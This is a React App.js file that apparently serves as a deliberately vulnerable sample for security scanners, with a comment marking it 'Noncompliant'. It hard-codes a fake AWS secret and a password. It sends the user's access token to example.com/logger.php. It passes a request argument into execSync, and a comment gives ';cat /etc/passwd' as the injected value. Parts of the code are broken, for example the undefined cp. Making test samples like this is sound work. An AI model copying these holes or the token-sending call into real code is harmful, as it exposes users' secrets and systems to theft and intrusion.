import React from 'react'
import logo from './logo.svg'
import './App.css'
import { getLocation } from './Location'

function App() {
  const { hostname, pathname } = getLocation()
  console.log('A')
  console.log('B')
  const AWS_SECRET_ACESS_KEY = '21321dshiushIPQBN!I@#ibdbsdsa'
  const teste = {
    login: 'douglas',
    password: 'teste.js',
  }
  const db = localStorage.setItem('DBBASE', getLocation())
  console.log(db)
  if (process.env.AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY) {
    alert('Unexpected Condition')
    fetch(
      'http://example.com/logger.php?token=' + localStorage.access_token,
    ).then((response) => {
      localStorage.setItem('teste', response.body)
      console.log({ localStorage })
    })
  }

  function teste555(req, res) {
    const cmd = 'ls ' + req.query.arg
    const db = window.openDatabase(
      'myDb',
      '1.0',
      'Personal secrets stored here',
      2 * 1024 * 1024,
    )
    const out = cp.execSync(cmd) // Noncompliant: example of a command injection, req.query.arg = -la . ;cat /etc/passwd
  }
  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} href={teste555()} className="App-logo" alt="logo" />
        <p data-cy="location">
          {hostname} {pathname}{' '}
        </p>
      </header>
    </div>
  )
}

export default App
